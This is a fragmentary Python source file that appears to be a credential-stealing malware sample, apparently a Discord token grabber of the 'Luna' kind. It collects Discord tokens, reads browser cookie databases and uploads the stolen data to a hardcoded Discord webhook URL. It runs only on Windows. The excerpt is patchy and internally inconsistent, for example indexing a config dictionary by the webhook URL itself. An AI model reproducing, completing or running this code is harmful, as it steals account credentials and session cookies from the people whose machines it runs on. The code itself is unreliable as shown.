...
def main(webhook: str):
    ...
    data = {
        "username": "Red Line Info",
        "avatar_url": "https://w7.pngwing.com/pngs/196/680/png-transparent-black-and-red-skull-illustration-printed-t-shirt-long-sleeved-t-shirt-devil-printing-tshirt-fashion-prints-thumbnail.png"
    }
...
class Discord:
    def __init__(self):
        ...
        self.grabTokens()
        self.upload(__CONFIG__["https://discord.com/api/webhooks/1158461862262865980/vwg-NRqtPDSPFlAQdZnFZYrTj9RdKCMAvk_A-oF8_zvHy4glLSXFokkxlmuiGv711vsS"])
        ...
        with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'a', encoding="utf-8") as f:
            ...
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                ...
                if host_key and name and value != "":
                    f.write(f"{host_key}\t{'True' if expires_utc == 0 else 'TRUE'}\t{path}\t{'True' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
        cursor.close()
        conn.close()
...
if __name__ == '__main__' and os.name == "nt":
    Luna(__CONFIG__["https://discord.com/api/webhooks/1158461862262865980/vwg-NRqtPDSPFlAQdZnFZYrTj9RdKCMAvk_A-oF8_zvHy4glLSXFokkxlmuiGv711vsS"])
